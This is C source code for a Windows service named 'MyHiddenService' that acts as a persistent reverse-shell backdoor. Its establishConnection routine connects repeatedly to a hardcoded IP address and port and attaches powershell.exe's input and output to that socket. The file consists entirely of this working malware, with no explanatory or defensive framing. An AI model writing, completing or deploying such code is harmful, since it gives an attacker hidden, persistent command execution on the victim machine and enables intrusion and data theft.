#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>

#define SERVER_IP "192.168.0.20"
#define SERVER_PORT 88

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char **argv);
void ControlHandler(DWORD request);
int establishConnection();

int main()
{
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MyHiddenService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;

    StartServiceCtrlDispatcher(ServiceTable);

    return 0;
}

void ServiceMain(int argc, char **argv)
{
    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;

    hStatus = RegisterServiceCtrlHandler("MyHiddenService", (LPHANDLER_FUNCTION)ControlHandler);
    if (hStatus == (SERVICE_STATUS_HANDLE)0)
    {
        // Failed to register control handler
        return;
    }

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    int connected = 0;

    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
        connected = establishConnection();
        if (!connected)
        {
            // Connection failed
            Sleep(5000); // Wait for 5 seconds before retrying the connection
        }
    }

    return;
}

void ControlHandler(DWORD request)
{
    if (request == SERVICE_CONTROL_STOP)
    {
        ServiceStatus.dwWin32ExitCode = 0;
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        return;
    }

    SetServiceStatus(hStatus, &ServiceStatus);
    return;
}

int establishConnection()
{
    WSADATA winsock;                 // Structure to hold Winsock data
    SOCKET shell;                    // Socket handle
    struct sockaddr_in shell_addr;   // Server address structure
    STARTUPINFO startinfo;           // Process startup information
    PROCESS_INFORMATION processinfo; // Process information
    char server[512];                // Buffer to receive server data
    int connection;                  // Connection status

    if (WSAStartup(MAKEWORD(2, 2), &winsock) != 0)
    {
        return 0; // Winsock initialization failed
    }

    if ((shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)) == INVALID_SOCKET)
    {
        return 0; // Failed to create socket
    }

    shell_addr.sin_port = htons(SERVER_PORT);          // Set server port
    shell_addr.sin_family = AF_INET;                   // Set address family to IPv4
    shell_addr.sin_addr.s_addr = inet_addr(SERVER_IP); // Set server IP address

    connection = WSAConnect(shell, (struct sockaddr *)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
    if (connection == SOCKET_ERROR)
    {
        return 0; // Failed to connect to the server
    }

    recv(shell, server, sizeof(server), 0);   // Receive data from the server
    memset(&startinfo, 0, sizeof(startinfo)); // Clear the startupinfo structure
    startinfo.cb = sizeof(startinfo);
    startinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    startinfo.hStdInput = startinfo.hStdOutput = startinfo.hStdError = (HANDLE)shell;
    CreateProcess(NULL, "powershell.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startinfo, &processinfo);
    WaitForSingleObject(processinfo.hProcess, INFINITE);
    CloseHandle(processinfo.hProcess);
    CloseHandle(processinfo.hThread);
    memset(server, 0, sizeof(server)); // Clear the server buffer

    WSACleanup(); // Cleanup Winsock

    return 1; // Connection successful
}
